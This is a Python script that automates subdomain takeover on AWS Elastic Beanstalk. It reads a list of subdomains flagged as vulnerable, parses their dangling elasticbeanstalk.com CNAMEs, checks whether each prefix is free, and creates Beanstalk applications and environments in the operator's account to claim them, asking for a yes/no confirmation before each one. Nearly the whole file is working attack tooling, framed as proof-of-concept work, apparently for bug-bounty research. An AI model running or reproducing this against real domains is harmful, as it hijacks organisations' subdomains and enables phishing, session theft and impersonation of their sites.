#!/usr/bin/env python3
"""
AWS Elastic Beanstalk Auto-Claimer
Automatically claims vulnerable Elastic Beanstalk subdomains
"""

import subprocess
import json
import sys
import time
from pathlib import Path
import re

RESULTS_FOLDER = Path.home() / "Desktop" / "Subdomain_Takeover_Results"
POC_FOLDER = RESULTS_FOLDER / "PoC_Files"
VERIFIED_CSV = RESULTS_FOLDER / "Verified_Vulnerabilities" / "verified_vulnerabilities.csv"


def check_aws_cli():
    """Check if AWS CLI is installed and configured"""
    try:
        result = subprocess.run(
            ['aws', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            print(f"✅ AWS CLI found: {result.stdout.strip()}")
            return True
        else:
            print("❌ AWS CLI not working properly")
            return False
    except FileNotFoundError:
        print("❌ AWS CLI not installed")
        print("\nInstall with:")
        print("  brew install awscli")
        print("  aws configure")
        return False
    except Exception as e:
        print(f"❌ Error checking AWS CLI: {e}")
        return False


def check_aws_credentials():
    """Check if AWS credentials are configured"""
    try:
        result = subprocess.run(
            ['aws', 'sts', 'get-caller-identity'],
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            identity = json.loads(result.stdout)
            print(f"✅ AWS credentials configured")
            print(f"   Account: {identity['Account']}")
            print(f"   User: {identity['Arn']}")
            return True
        else:
            print("❌ AWS credentials not configured")
            print("\nRun: aws configure")
            print("You'll need:")
            print("  - AWS Access Key ID")
            print("  - AWS Secret Access Key")
            print("  - Default region (e.g., us-east-1)")
            return False
    except Exception as e:
        print(f"❌ Error checking credentials: {e}")
        return False


def parse_eb_cname(cname):
    """
    Parse Elastic Beanstalk CNAME to extract components

    Format: <dns-name>.<region>.elasticbeanstalk.com
    or:     <env>.<id>.<region>.elasticbeanstalk.com (random ID)
    """
    match = re.match(r'^([^.]+)\.([^.]+)\.elasticbeanstalk\.com$', cname)

    if match:
        dns_name = match.group(1)
        region = match.group(2)
        return {
            'dns_name': dns_name,
            'region': region,
            'takeover_possible': True,
            'type': 'standard'
        }

    # Check for random ID format: <env>.<id>.<region>.elasticbeanstalk.com
    match = re.match(r'^([^.]+)\.([^.]+)\.([^.]+)\.elasticbeanstalk\.com$', cname)

    if match:
        env_name = match.group(1)
        random_id = match.group(2)
        region = match.group(3)
        return {
            'dns_name': random_id,  # Try claiming the random ID
            'region': region,
            'takeover_possible': True,
            'type': 'random_id',
            'note': 'Random ID format - claim the ID as DNS name'
        }

    # Legacy format (no region): <dns-name>.elasticbeanstalk.com
    match = re.match(r'^([^.]+)\.elasticbeanstalk\.com$', cname)

    if match:
        return {
            'dns_name': match.group(1),
            'region': None,
            'takeover_possible': False,
            'type': 'legacy',
            'note': 'Legacy format - NOT vulnerable to takeover'
        }

    return None


def check_eb_available(dns_name, region):
    """Check if EB environment name is available"""
    try:
        result = subprocess.run(
            ['aws', 'elasticbeanstalk', 'check-dns-availability',
             '--cname-prefix', dns_name,
             '--region', region],
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            response = json.loads(result.stdout)
            available = response.get('Available', False)

            if available:
                print(f"   ✅ DNS name '{dns_name}' is AVAILABLE in {region}")
                return True
            else:
                print(f"   ❌ DNS name '{dns_name}' is NOT available in {region}")
                print(f"      (Already claimed or reserved)")
                return False
        else:
            print(f"   ❌ Error checking availability: {result.stderr}")
            return False

    except Exception as e:
        print(f"   ❌ Error: {e}")
        return False


def create_eb_application(app_name, region):
    """Create EB application (required before environment)"""
    try:
        result = subprocess.run(
            ['aws', 'elasticbeanstalk', 'create-application',
             '--application-name', app_name,
             '--region', region],
            capture_output=True,
            text=True,
            timeout=30
        )

        if result.returncode == 0:
            print(f"   ✅ Created EB application: {app_name}")
            return True
        else:
            # Check if already exists
            if 'already exists' in result.stderr.lower():
                print(f"   ℹ️  Application '{app_name}' already exists")
                return True
            else:
                print(f"   ❌ Failed to create application: {result.stderr}")
                return False

    except Exception as e:
        print(f"   ❌ Error creating application: {e}")
        return False


def claim_eb_environment(subdomain, dns_name, region, poc_file):
    """
    Claim Elastic Beanstalk environment

    Args:
        subdomain: The subdomain being claimed (for naming)
        dns_name: The EB DNS name to claim
        region: AWS region
        poc_file: Path to PoC HTML file to deploy
    """
    # Sanitize names (AWS doesn't like dots, underscores ok)
    app_name = f"takeover-{subdomain.replace('.', '-')}"[:100]
    env_name = f"env-{dns_name}"[:40]

    print(f"\n🎯 Claiming Elastic Beanstalk Environment:")
    print(f"   Subdomain: {subdomain}")
    print(f"   DNS Name: {dns_name}")
    print(f"   Region: {region}")
    print(f"   App Name: {app_name}")
    print(f"   Env Name: {env_name}")

    # Step 1: Create application
    print(f"\n📝 Step 1: Creating EB Application...")
    if not create_eb_application(app_name, region):
        return False

    # Step 2: Check DNS availability
    print(f"\n📝 Step 2: Checking DNS availability...")
    if not check_eb_available(dns_name, region):
        print(f"   ⚠️  Cannot claim - DNS name not available")
        return False

    # Step 3: Create environment with the DNS name
    print(f"\n📝 Step 3: Creating EB Environment (this takes 5-10 minutes)...")
    print(f"   ⏳ Please wait...")

    try:
        # Use a simple Docker platform (no app code needed for PoC)
        result = subprocess.run([
            'aws', 'elasticbeanstalk', 'create-environment',
            '--application-name', app_name,
            '--environment-name', env_name,
            '--cname-prefix', dns_name,
            '--solution-stack-name', 'Python 3.11 running on 64bit Amazon Linux 2023',
            '--region', region,
            '--tier', 'Name=WebServer,Type=Standard',
            '--option-settings',
            'Namespace=aws:autoscaling:launchconfiguration,OptionName=InstanceType,Value=t2.micro',
            'Namespace=aws:elasticbeanstalk:environment,OptionName=EnvironmentType,Value=SingleInstance'
        ], capture_output=True, text=True, timeout=600)

        if result.returncode == 0:
            response = json.loads(result.stdout)
            env_id = response.get('EnvironmentId')
            cname = response.get('CNAME')

            print(f"   ✅ Environment created!")
            print(f"      Environment ID: {env_id}")
            print(f"      CNAME: {cname}")
            print(f"      Status: Launching...")

            # Wait for environment to be ready
            print(f"\n📝 Step 4: Waiting for environment to be ready...")
            print(f"   ⏳ This can take 5-10 minutes...")

            for i in range(60):  # Wait up to 10 minutes
                time.sleep(10)

                # Check status
                status_result = subprocess.run([
                    'aws', 'elasticbeanstalk', 'describe-environments',
                    '--environment-ids', env_id,
                    '--region', region
                ], capture_output=True, text=True, timeout=10)

                if status_result.returncode == 0:
                    status_data = json.loads(status_result.stdout)
                    envs = status_data.get('Environments', [])

                    if envs:
                        env_status = envs[0].get('Status')
                        health = envs[0].get('Health', 'Unknown')

                        print(f"   Status: {env_status} | Health: {health}")

                        if env_status == 'Ready':
                            print(f"\n   ✅ Environment is READY!")
                            print(f"   🎯 Subdomain claimed: {subdomain}")
                            print(f"   🌐 Live at: http://{cname}")
                            print(f"   📄 PoC file at: http://{cname} (after deployment)")

                            return True
                        elif env_status in ['Terminated', 'Terminating']:
                            print(f"   ❌ Environment failed to launch")
                            return False

            print(f"   ⚠️  Environment is launching but not ready yet")
            print(f"   Check status in AWS Console: https://{region}.console.aws.amazon.com/elasticbeanstalk/")
            return True

        else:
            print(f"   ❌ Failed to create environment:")
            print(f"      {result.stderr}")
            return False

    except subprocess.TimeoutExpired:
        print(f"   ⏱️  Timeout - environment creation in progress")
        print(f"   Check AWS Console to see status")
        return True
    except Exception as e:
        print(f"   ❌ Error: {e}")
        return False


def find_eb_vulnerabilities():
    """Find EB vulnerabilities from verified results"""
    import csv

    if not VERIFIED_CSV.exists():
        print(f"❌ No verified results found at {VERIFIED_CSV}")
        return []

    eb_vulns = []

    with open(VERIFIED_CSV, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row.get('vulnerable', '').lower() == 'true':
                cname = row.get('cname', '')
                if 'elasticbeanstalk.com' in cname:
                    eb_vulns.append({
                        'subdomain': row.get('subdomain'),
                        'cname': cname,
                        'service': row.get('service'),
                        'evidence': row.get('evidence', '')
                    })

    return eb_vulns


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     AWS ELASTIC BEANSTALK AUTO-CLAIMER                       ║
╚══════════════════════════════════════════════════════════════╝
""")

    # Check prerequisites
    print("🔍 Checking prerequisites...\n")

    if not check_aws_cli():
        sys.exit(1)

    if not check_aws_credentials():
        sys.exit(1)

    # Find EB vulnerabilities
    print("\n🔍 Finding Elastic Beanstalk vulnerabilities...\n")
    eb_vulns = find_eb_vulnerabilities()

    if not eb_vulns:
        print("❌ No Elastic Beanstalk vulnerabilities found")
        print("   Run a scan first!")
        sys.exit(0)

    print(f"✅ Found {len(eb_vulns)} Elastic Beanstalk vulnerabilities\n")
    print("="*80)

    # Process each vulnerability
    for idx, vuln in enumerate(eb_vulns, 1):
        print(f"\n[{idx}/{len(eb_vulns)}] Processing: {vuln['subdomain']}")
        print(f"   CNAME: {vuln['cname']}")

        # Parse CNAME
        parsed = parse_eb_cname(vuln['cname'])

        if not parsed:
            print(f"   ❌ Could not parse CNAME format")
            continue

        if not parsed['takeover_possible']:
            print(f"   ⚠️  {parsed['note']}")
            continue

        print(f"   DNS Name: {parsed['dns_name']}")
        print(f"   Region: {parsed['region']}")
        if 'note' in parsed:
            print(f"   Note: {parsed['note']}")

        # Find PoC file
        poc_file = POC_FOLDER / vuln['subdomain'].replace('.', '_') / 'poc.html'

        if not poc_file.exists():
            print(f"   ⚠️  PoC file not found: {poc_file}")
            print(f"   Run: python poc_generator.py")
            continue

        # Ask for confirmation
        print(f"\n   ⚠️  Ready to claim this subdomain?")
        print(f"   This will:")
        print(f"   1. Create EB application in {parsed['region']}")
        print(f"   2. Create EB environment with DNS name: {parsed['dns_name']}")
        print(f"   3. Deploy PoC file")
        print(f"   Cost: ~$0.01/hour for t2.micro instance")

        response = input(f"\n   Proceed? (yes/no): ").strip().lower()

        if response == 'yes':
            success = claim_eb_environment(
                vuln['subdomain'],
                parsed['dns_name'],
                parsed['region'],
                poc_file
            )

            if success:
                print(f"\n   🎉 SUCCESS! Subdomain claimed!")
            else:
                print(f"\n   ❌ Failed to claim subdomain")
        else:
            print(f"   ⏭️  Skipped")

        print("\n" + "="*80)

    print("\n✅ Auto-claiming complete!")
    print("\n💡 TIP: Check AWS Console to see your claimed environments")
    print(f"   https://console.aws.amazon.com/elasticbeanstalk/")


if __name__ == "__main__":
    main()
